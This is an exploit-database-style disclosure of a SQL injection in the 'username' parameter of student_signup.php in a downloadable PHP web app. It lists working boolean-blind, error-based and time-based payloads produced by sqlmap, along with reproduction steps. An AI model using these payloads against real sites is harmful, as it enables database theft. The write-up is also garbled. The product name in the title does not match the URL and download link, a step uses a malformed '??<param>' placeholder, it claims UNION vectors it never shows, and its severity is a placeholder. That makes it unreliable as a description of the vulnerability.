# Exploit Title: Engineers Online Portal – SQL Injection in student_signup.php (`http://localhost/niamunozmonitoringsystem/student_signup.php`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html  
**Software Link:** https://www.sourcecodester.com/sites/default/files/download/oretnom23/nia_munoz_monitoring_system.zip  
**Version:** 1.0.7.18  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `student_signup.php` endpoint of **Engineers Online Portal**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.0 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost/niamunozmonitoringsystem/student_signup.php`
- **HTTP Method:** POST
- **Vulnerable File:** `student_signup.php`
- **Parameter:** `username`
- **Vector Location:** POST

### Injection Techniques (as identified by sqlmap)
- **Type:** boolean-based blind
  - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  - **Payload:** `username=test' AND 8473=(SELECT (CASE WHEN (8473=8473) THEN 8473 ELSE (SELECT 3900 UNION SELECT 6859) END))-- -`
- **Type:** error-based
  - **Title:** MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
  - **Payload:** 
```
username=test' OR (SELECT 2258 FROM(SELECT COUNT(*),CONCAT(0x7176626b71,(SELECT (ELT(2258=2258,1))),0x716b767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- gNLV
```
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `username=test' AND (SELECT 3400 FROM (SELECT(SLEEP(5)))BlhQ)-- hjpa`



## Proof of Concept (Burp Repeater)

![burp-repeater-poc](poc.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost/niamunozmonitoringsystem/student_signup.php`.  
2. Intercept the request and inject the provided payload(s) into parameter `student_signup.php??<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References
OWASP: SQL Injection Prevention Cheat Sheet

CWE-89: SQL Injection
